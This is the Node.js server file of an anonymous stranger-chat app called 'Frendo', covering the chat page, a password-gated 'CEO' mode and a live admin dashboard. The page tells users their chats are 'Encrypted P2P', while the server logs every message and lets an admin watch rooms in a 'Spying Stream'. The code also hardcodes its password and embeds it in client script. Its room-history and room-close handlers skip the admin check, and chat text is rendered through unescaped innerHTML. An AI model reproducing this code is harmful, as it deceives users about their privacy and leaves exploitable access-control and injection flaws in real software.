const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 10000;
const HOST = '0.0.0.0';

const SECRET_PASS = "xiaoqi143@";

let activeUsers = 0;
let waitingQueue = []; 
let activeRooms = {}; 
let adminLogs = {}; 

app.use(express.json());

app.get('/', (req, res) => { renderApp(res, false); });

app.get('/ceo', (req, res) => { 
  const pass = req.query.pass;
  if (pass === SECRET_PASS) {
    renderApp(res, true); 
  } else {
    renderApp(res, false);
  }
});

function renderApp(res, isCEO) {
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Frendo - Anonymous Chat</title>
      <script src="/socket.io/socket.io.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        html, body { height: 100dvh; width: 100vw; overflow: hidden; background: #F8FAFC; color: #0F172A; }

        #customToast {
          position: fixed; top: -70px; left: 50%; transform: translateX(-50%);
          background: #EF4444; color: white; padding: 12px 24px; border-radius: 30px; font-weight: bold;
          font-size: 13px; box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3); z-index: 1000;
          transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
          display: flex; align-items: center; gap: 8px; border: 1px solid rgba(255,255,255,0.4);
        }
        #customToast.show { top: 20px; }

        #ceoToast {
          position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
          background: linear-gradient(135deg, #F59E0B, #D97706);
          color: #FFF; padding: 14px 28px; border-radius: 30px; font-weight: 900;
          font-size: 14px; box-shadow: 0 10px 30px rgba(245, 158, 11, 0.4); z-index: 1001;
          transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
          display: flex; align-items: center; gap: 8px; border: 2px solid #FFF; text-transform: uppercase; letter-spacing: 1px;
        }
        #ceoToast.show { top: 25px; }

        .app-landing {
          width: 100vw; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: space-between;
          padding: 50px 24px; background: linear-gradient(180deg, #EFF6FF 0%, #F8FAFC 100%); text-align: center;
          position: absolute; top: 0; left: 0; z-index: 10; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .app-landing.hide { transform: translateY(-100%); }

        .logo-glow {
          width: 110px; height: 110px; border-radius: 50%;
          background: linear-gradient(135deg, #2563EB, #4F46E5); padding: 3px;
          box-shadow: 0 10px 30px rgba(37, 99, 235, 0.25); display: flex; align-items: center; justify-content: center; margin-top: 10px;
        }
        .logo-inner { width: 100%; height: 100%; background: #FFFFFF; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .logo-text { font-size: 20px; font-weight: 900; letter-spacing: 3px; background: linear-gradient(135deg, #2563EB, #4F46E5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .app-title-section h1 { font-size: 26px; font-weight: 800; color: #0F172A; margin-bottom: 8px; letter-spacing: -0.5px; }
        .app-title-section p { font-size: 14px; color: #64748B; max-width: 290px; margin: 0 auto; line-height: 1.4; }

        .details-box {
          background: #FFFFFF; border: 1px solid #E2E8F0;
          border-radius: 20px; padding: 18px; width: 100%; max-width: 320px; display: flex; flex-direction: column; gap: 12px;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.04);
        }
        .detail-item { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #64748B; font-weight: 600; }
        .detail-item span.val { font-weight: 700; color: #10B981; }

        .btn-text-tab {
          width: 100%; max-width: 320px; background: linear-gradient(135deg, #2563EB, #1D4ED8); color: #fff; border: none;
          padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer;
          box-shadow: 0 10px 25px rgba(37, 99, 235, 0.3); transition: transform 0.2s;
        }
        .btn-text-tab:active { transform: scale(0.98); }

        .chat-card { width: 100vw; height: 100dvh; background: #F8FAFC; display: flex; flex-direction: column; position: relative; }
        .header { padding: 12px 18px; background: #FFFFFF; border-bottom: 1px solid #E2E8F0; display: flex; justify-content: space-between; align-items: center; z-index: 5; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
        .btn-back { background: #F1F5F9; border: 1px solid #E2E8F0; color: #475569; padding: 6px 12px; border-radius: 10px; font-size: 12px; cursor: pointer; font-weight: 600; margin-right: 10px; }
        
        .online-badge { display: flex; align-items: center; gap: 6px; background: #ECFDF5; border: 1px solid #A7F3D0; padding: 4px 12px; border-radius: 20px; font-size: 12px; color: #059669; font-weight: 700; }
        .pulse-dot { width: 8px; height: 8px; background-color: #10B981; border-radius: 50%; box-shadow: 0 0 8px #10B981; }

        .message-area { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; background: #F1F5F9; }
        .msg { padding: 12px 16px; border-radius: 18px; max-width: 80%; word-break: break-word; font-size: 14px; line-height: 1.4; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
        .msg.me { align-self: flex-end; background: linear-gradient(135deg, #2563EB, #1D4ED8); color: #fff; border-bottom-right-radius: 4px; }
        .msg.me-ceo { align-self: flex-end; background: linear-gradient(135deg, #F59E0B, #D97706); color: #FFF; font-weight: bold; border-bottom-right-radius: 4px; }
        .msg.stranger { align-self: flex-start; background: #FFFFFF; color: #0F172A; border-bottom-left-radius: 4px; border: 1px solid #E2E8F0; }
        .msg.ceo-msg { align-self: flex-start; background: linear-gradient(135deg, #F59E0B, #D97706); color: #FFF; font-weight: bold; border-bottom-left-radius: 4px; border: 1px solid #FBBF24; }

        .action-bar { padding: 10px 18px; background: #FFFFFF; border-top: 1px solid #E2E8F0; display: flex; gap: 10px; }
        .btn-action { flex: 1; border: none; padding: 12px; border-radius: 12px; font-weight: 700; cursor: pointer; font-size: 13px; transition: transform 0.1s; }
        .btn-action:active { transform: scale(0.97); }
        .btn-skip { background: #F59E0B; color: #FFF; }
        .btn-end { background: #EF4444; color: #FFF; }
        .btn-start { background: #10B981; color: #FFF; width: 100%; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.25); }

        .input-area { padding: 12px 18px; background: #FFFFFF; border-top: 1px solid #E2E8F0; display: flex; gap: 10px; align-items: center; }
        .input-area input { flex: 1; background: #F8FAFC; border: 1px solid #CBD5E1; border-radius: 12px; padding: 12px 16px; color: #0F172A; outline: none; font-size: 14px; transition: border 0.2s; }
        .input-area input:focus { border-color: #2563EB; background: #FFF; }
        .send-btn { border: none; padding: 12px 18px; border-radius: 12px; font-weight: 700; cursor: pointer; background: #2563EB; color: #fff; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25); }
        .send-btn:disabled { opacity: 0.5; cursor: not-allowed; }
      </style>
    </head>
    <body>

      <div id="customToast"><span>⚠️ Stranger Disconnected!</span></div>
      <div id="ceoToast"><span>👑 WOW! Connected with CEO! 👑</span></div>

      <div id="landingScreen" class="app-landing">
        <div>
          <div class="logo-glow"><div class="logo-inner"><span class="logo-text">FRENDO</span></div></div>
        </div>
        <div class="app-title-section">
          <h1>Connect & Chat</h1>
          <p>Talk with random strangers anonymously across the globe.</p>
        </div>
        <div class="details-box">
          <div class="detail-item"><span>Security</span><span class="val" style="color:#2563EB;">🔒 Encrypted P2P</span></div>
          <div class="detail-item"><span>Server Status</span><span class="val">🟢 Live</span></div>
          <div class="detail-item"><span>Active Users</span><span class="val" id="landingOnlineCount">0 Online</span></div>
        </div>
        <button class="btn-text-tab" onclick="openChatScreen()">💬 START CHATTING</button>
      </div>

      <div class="chat-card">
        <div class="header">
          <div style="display: flex; align-items: center;">
            <button class="btn-back" onclick="closeChatScreen()">⬅ Back</button>
            <div>
              <h3 style="font-size:15px; font-weight:700; color:#0F172A;">Frendo Chat ${isCEO ? '<span style="font-size:10px; background:#F59E0B; color:#FFF; padding:2px 6px; border-radius:4px; margin-left:4px; font-weight:900;">👑 CEO</span>' : ''}</h3>
              <span id="statusText" style="font-size: 11px; color: #64748B;">Offline</span>
            </div>
          </div>
          <div class="online-badge"><span class="pulse-dot"></span><span id="onlineCountText">0 Online</span></div>
        </div>

        <div class="message-area" id="messageArea"></div>

        <div class="action-bar">
          <button id="startBtn" class="btn-action btn-start" onclick="handleConnect()">Start New Chat</button>
          <button id="skipBtn" class="btn-action btn-skip" onclick="handleSkip()" style="display: none;">⏩ Skip</button>
          <button id="endBtn" class="btn-action btn-end" onclick="handleEndChat()" style="display: none;">❌ End</button>
        </div>

        <div class="input-area">
          <input type="text" id="msgInput" placeholder="Connect first to message..." disabled />
          <button id="sendBtn" class="send-btn" onclick="sendMessage()" disabled>Send</button>
        </div>
      </div>

      <script>
        const socket = io();
        const IS_CEO = ${isCEO};
        let isConnected = false;

        const landingScreen = document.getElementById('landingScreen');
        const landingOnlineCount = document.getElementById('landingOnlineCount');
        const statusText = document.getElementById('statusText');
        const onlineCountText = document.getElementById('onlineCountText');
        const startBtn = document.getElementById('startBtn');
        const skipBtn = document.getElementById('skipBtn');
        const endBtn = document.getElementById('endBtn');
        const messageArea = document.getElementById('messageArea');
        const msgInput = document.getElementById('msgInput');
        const sendBtn = document.getElementById('sendBtn');
        const customToast = document.getElementById('customToast');
        const ceoToast = document.getElementById('ceoToast');

        function openChatScreen() { 
          landingScreen.classList.add('hide'); 
          clearChatHistory();
        }

        function closeChatScreen() { 
          if(isConnected) handleEndChat(); 
          else resetState();
          landingScreen.classList.remove('hide'); 
        }

        function clearChatHistory() {
          messageArea.innerHTML = '';
        }

        socket.on('update_online_count', (count) => {
          onlineCountText.innerText = count + ' Online';
          landingOnlineCount.innerText = count + ' Online';
        });

        function handleConnect() {
          clearChatHistory();
          socket.emit('find_partner', { isCEO: IS_CEO });
          statusText.innerText = 'Searching...';
          startBtn.style.display = 'none';
          skipBtn.style.display = 'inline-block';
          endBtn.style.display = 'inline-block';
        }

        function handleSkip() { 
          socket.emit('skip_chat'); 
          resetState(); 
          handleConnect(); 
        }
        
        function handleEndChat() { 
          socket.emit('skip_chat'); 
          resetState(); 
        }

        function showToast(msg) {
          customToast.querySelector('span').innerText = msg;
          customToast.classList.add('show');
          setTimeout(() => { customToast.classList.remove('show'); }, 3000);
        }

        function resetState() {
          isConnected = false;
          statusText.innerText = 'Offline';
          startBtn.style.display = 'block';
          skipBtn.style.display = 'none';
          endBtn.style.display = 'none';
          msgInput.disabled = true;
          sendBtn.disabled = true;
          msgInput.placeholder = 'Connect first to message...';
          clearChatHistory();
        }

        socket.on('waiting', () => { statusText.innerText = 'Searching...'; });

        socket.on('chat_start', (data) => {
          isConnected = true;
          statusText.innerText = 'Connected';
          msgInput.disabled = false;
          sendBtn.disabled = false;
          msgInput.placeholder = 'Type a message...';
          clearChatHistory();

          if (data && data.hasCEO && !IS_CEO) {
            triggerCEOEntrance();
          }
        });

        function triggerCEOEntrance() {
          ceoToast.classList.add('show');
          setTimeout(() => { ceoToast.classList.remove('show'); }, 4000);

          const duration = 5 * 1000;
          const animationEnd = Date.now() + duration;

          const interval = setInterval(function() {
            const timeLeft = animationEnd - Date.now();
            if (timeLeft <= 0) {
              return clearInterval(interval);
            }

            confetti({
              particleCount: 30,
              angle: 60,
              spread: 60,
              origin: { x: 0.1, y: 0.8 },
              colors: ['#ef4444', '#facc15', '#22c55e']
            });
            confetti({
              particleCount: 30,
              angle: 120,
              spread: 60,
              origin: { x: 0.9, y: 0.8 },
              colors: ['#ef4444', '#facc15', '#22c55e']
            });
          }, 800);
        }

        socket.on('receive_message', (data) => { 
          const msgType = data.isCEO ? 'ceo-msg' : 'stranger';
          addMessage(data.message, msgType); 
        });
        
        socket.on('stranger_left', () => { 
          showToast('⚠️ Stranger disconnected!'); 
          resetState(); 
        });

        function sendMessage() {
          const text = msgInput.value.trim();
          if (text && isConnected) {
            socket.emit('send_message', { message: text, isCEO: IS_CEO });
            const myMsgClass = IS_CEO ? 'me-ceo' : 'me';
            addMessage(text, myMsgClass);
            msgInput.value = '';
          }
        }

        function addMessage(text, type) {
          const div = document.createElement('div');
          div.className = 'msg ' + type;
          div.innerText = text;
          messageArea.appendChild(div);
          messageArea.scrollTop = messageArea.scrollHeight;
        }

        msgInput.addEventListener('keypress', (e) => {
          if (e.key === 'Enter') sendMessage();
        });
      </script>
    </body>
    </html>
  `;
  res.send(htmlContent);
}

// Protected Admin Control Panel Route
app.get('/admin', (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_PASS) return res.status(403).send("Forbidden: Invalid Password");

  const adminHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Frendo Live Admin Control Center</title>
      <script src="/socket.io/socket.io.js"></script>
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background: #F8FAFC; color: #0F172A; padding: 20px; display: flex; flex-direction: column; gap: 20px; }
        .stats { display: flex; gap: 15px; }
        .card { background: #FFFFFF; padding: 15px 25px; border-radius: 10px; border: 1px solid #E2E8F0; flex: 1; box-shadow: 0 4px 10px rgba(0,0,0,0.02); }
        .card h4 { color: #64748B; font-size: 12px; }
        .card p { font-size: 26px; font-weight: bold; color: #2563EB; margin-top: 4px; }
        
        .main-container { display: flex; gap: 20px; height: 420px; }
        .box { flex: 1; background: #FFFFFF; border-radius: 10px; padding: 15px; overflow-y: auto; border: 1px solid #E2E8F0; box-shadow: 0 4px 10px rgba(0,0,0,0.02); }
        .spy-box { flex: 2; background: #0F172A; color: #FFF; border-radius: 10px; padding: 15px; display: flex; flex-direction: column; border: 1px solid #1E293B; }
        
        .room-item { background: #F1F5F9; padding: 12px; border-radius: 8px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border: 1px solid #E2E8F0; }
        .room-item:hover { background: #2563EB; color: #FFF; }
        .room-item.active { background: #2563EB; color: #FFF; font-weight: bold; }
        .btn-delete { background: #EF4444; border: none; color: #fff; padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; font-weight: bold; }
        
        #chatStream { flex: 1; overflow-y: auto; font-family: monospace; font-size: 13px; color: #38BDF8; margin-top: 10px; border-top: 1px solid #1E293B; padding-top: 10px; }
        
        table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
        th, td { padding: 10px; border-bottom: 1px solid #E2E8F0; }
        th { color: #64748B; }
      </style>
    </head>
    <body>
      <h2>⚡ Live Control Dashboard</h2>
      
      <div class="stats">
        <div class="card"><h4>ONLINE USERS</h4><p id="uCount">0</p></div>
        <div class="card"><h4>ACTIVE ROOMS</h4><p id="rCount">0</p></div>
        <div class="card"><h4>WAITING IN QUEUE</h4><p id="qCount" style="color:#D97706;">0</p></div>
      </div>

      <div class="main-container">
        <div class="box">
          <h3 style="margin-bottom:12px; font-size: 14px; color:#2563EB;">Active Chat Rooms (Live)</h3>
          <div id="roomContainer"><i>No active rooms currently...</i></div>
        </div>

        <div class="spy-box">
          <h3 id="spyTitle" style="font-size:14px; color:#FBBF24;">Target Room: None Selected</h3>
          <div id="chatStream">Select an active room from the left list to monitor live messages...</div>
        </div>
      </div>

      <div class="box" style="height:200px;">
        <h3 style="margin-bottom:10px; font-size: 14px; color:#D97706;">⏳ Searching Queue</h3>
        <table>
          <thead>
            <tr>
              <th>User Tag</th>
              <th>Status</th>
              <th>Role</th>
            </tr>
          </thead>
          <tbody id="queueTableBody">
            <tr><td colspan="3"><i>No users waiting in queue...</i></td></tr>
          </tbody>
        </table>
      </div>

      <script>
        const socket = io();
        let selectedRoom = null;

        function authenticateAdmin() {
          socket.emit('admin_auth', { pass: "${SECRET_PASS}" });
        }

        socket.on('connect', () => {
          authenticateAdmin();
        });

        setInterval(() => {
          if (socket.connected) {
            socket.emit('admin_auth', { pass: "${SECRET_PASS}" });
          }
        }, 1000);

        socket.on('admin_stats_update', (data) => {
          document.getElementById('uCount').innerText = data.activeUsers;
          document.getElementById('rCount').innerText = data.roomCount;
          document.getElementById('qCount').innerText = data.queue.length;
          renderRooms(data.rooms);
          renderQueue(data.queue);
        });

        function renderRooms(rooms) {
          const container = document.getElementById('roomContainer');
          if (!rooms || rooms.length === 0) { 
            container.innerHTML = '<i>No active rooms currently...</i>'; 
            if (selectedRoom) {
              document.getElementById('spyTitle').innerText = 'Target Room: Closed';
              document.getElementById('chatStream').innerHTML = '<i>Room was disconnected...</i>';
              selectedRoom = null;
            }
            return; 
          }
          container.innerHTML = '';
          rooms.forEach(room => {
            const div = document.createElement('div');
            div.className = 'room-item ' + (selectedRoom === room.id ? 'active' : '');
            div.innerHTML = '<span>🔒 Room ID: ' + room.id + '</span> <button class="btn-delete" onclick="deleteRoom(\\'' + room.id + '\\', event)">Disconnect Room</button>';
            div.onclick = () => selectRoom(room.id);
            container.appendChild(div);
          });
        }

        function deleteRoom(roomId, event) {
          event.stopPropagation();
          socket.emit('admin_close_room', roomId);
        }

        function renderQueue(queue) {
          const tbody = document.getElementById('queueTableBody');
          if (!queue || queue.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3"><i>No users waiting in queue...</i></td></tr>';
            return;
          }
          tbody.innerHTML = '';
          queue.forEach((item, idx) => {
            const tr = document.createElement('tr');
            tr.innerHTML = '<td>Stranger ' + (idx + 1) + '</td><td><span style="color:#D97706">Searching...</span></td><td>' + (item.isCEO ? '👑 CEO' : 'User') + '</td>';
            tbody.appendChild(tr);
          });
        }

        function selectRoom(roomId) {
          selectedRoom = roomId;
          document.getElementById('spyTitle').innerText = 'Target Room: ' + roomId;
          document.getElementById('chatStream').innerHTML = '<i>-- Connected to ' + roomId + ' --</i><br>';
          socket.emit('get_room_history', roomId);
        }

        socket.on('admin_chat_history', (data) => {
          if (data.roomId === selectedRoom) {
            const stream = document.getElementById('chatStream');
            stream.innerHTML = '<i>-- Spying Stream: ' + data.roomId + ' --</i><br>';
            data.history.forEach(log => appendLog(log));
          }
        });

        socket.on('admin_chat_log', (data) => {
          if (data.roomId === selectedRoom) {
            appendLog(data);
          }
        });

        function appendLog(data) {
          const stream = document.getElementById('chatStream');
          const color = data.sender.includes('CEO') ? '#facc15' : '#38bdf8';
          stream.innerHTML += '<div style="margin-top:6px;"><b style="color:' + color + '">[' + data.sender + ']:</b> ' + data.msg + '</div>';
          stream.scrollTop = stream.scrollHeight;
        }
      </script>
    </body>
    </html>
  `;
  res.send(adminHtml);
});

// Realtime Engine Logic
io.on('connection', (socket) => {
  activeUsers++;
  io.emit('update_online_count', activeUsers);
  broadcastAdminStats();

  socket.on('admin_auth', (data) => {
    if (data.pass === SECRET_PASS) {
      socket.isAdmin = true;
      socket.join('admin_room');
      broadcastAdminStats();
    }
  });

  socket.on('get_room_history', (roomId) => {
    socket.emit('admin_chat_history', {
      roomId,
      history: adminLogs[roomId] || []
    });
  });

  socket.on('admin_close_room', (roomId) => {
    if (activeRooms[roomId]) {
      io.to(roomId).emit('stranger_left');
      delete activeRooms[roomId];
      delete adminLogs[roomId];
      broadcastAdminStats();
    }
  });

  socket.on('find_partner', (data) => {
    socket.isCEO = data && data.isCEO;

    waitingQueue = waitingQueue.filter(id => {
      const s = io.sockets.sockets.get(id);
      return s && s.connected && !s.currentRoom;
    });

    waitingQueue = waitingQueue.filter(id => id !== socket.id);

    if (waitingQueue.length > 0) {
      const partnerId = waitingQueue.shift();
      const partner = io.sockets.sockets.get(partnerId);

      if (partner && partner.connected) {
        const roomId = `Room_${Math.floor(1000 + Math.random() * 9000)}`;
        const hasCEO = socket.isCEO || partner.isCEO;

        socket.join(roomId);
        partner.join(roomId);
        socket.currentRoom = roomId;
        partner.currentRoom = roomId;

        let user1Label = socket.isCEO ? "👑 CEO" : "Stranger 1";
        let user2Label = partner.isCEO ? "👑 CEO" : (socket.isCEO ? "Stranger 1" : "Stranger 2");

        activeRooms[roomId] = {
          users: [
            { id: socket.id, label: user1Label },
            { id: partner.id, label: user2Label }
          ]
        };
        adminLogs[roomId] = [];

        socket.emit('chat_start', { hasCEO });
        partner.emit('chat_start', { hasCEO });
      } else {
        waitingQueue.push(socket.id);
        socket.emit('waiting');
      }
    } else {
      waitingQueue.push(socket.id);
      socket.emit('waiting');
    }
    broadcastAdminStats();
  });

  socket.on('send_message', (data) => {
    if (socket.currentRoom && activeRooms[socket.currentRoom]) {
      socket.to(socket.currentRoom).emit('receive_message', {
        message: data.message,
        isCEO: socket.isCEO
      });

      const roomData = activeRooms[socket.currentRoom];
      const userObj = roomData ? roomData.users.find(u => u.id === socket.id) : null;
      const senderLabel = userObj ? userObj.label : (socket.isCEO ? "👑 CEO" : "Stranger");

      const logEntry = {
        roomId: socket.currentRoom,
        sender: senderLabel,
        msg: data.message
      };

      if (!adminLogs[socket.currentRoom]) adminLogs[socket.currentRoom] = [];
      adminLogs[socket.currentRoom].push(logEntry);

      io.to('admin_room').emit('admin_chat_log', logEntry);
    }
  });

  socket.on('skip_chat', () => {
    removeFromRoom(socket);
    broadcastAdminStats();
  });

  socket.on('disconnect', () => {
    activeUsers = Math.max(0, activeUsers - 1);
    io.emit('update_online_count', activeUsers);
    waitingQueue = waitingQueue.filter((id) => id !== socket.id);
    removeFromRoom(socket);
    broadcastAdminStats();
  });
});

function removeFromRoom(socket) {
  if (socket.currentRoom) {
    socket.to(socket.currentRoom).emit('stranger_left');
    socket.leave(socket.currentRoom);
    delete activeRooms[socket.currentRoom];
    delete adminLogs[socket.currentRoom];
    socket.currentRoom = null;
  }
}

function broadcastAdminStats() {
  const roomList = Object.keys(activeRooms).map(id => ({ id }));
  const queueData = waitingQueue.map(id => {
    const s = io.sockets.sockets.get(id);
    return { id: id, isCEO: s ? s.isCEO : false };
  });

  io.to('admin_room').emit('admin_stats_update', {
    activeUsers,
    roomCount: roomList.length,
    rooms: roomList,
    queue: queueData
  });
}

setInterval(() => {
  broadcastAdminStats();
}, 1000);

server.listen(PORT, HOST, () => console.log(`Server listening live on http://${HOST}:${PORT}`));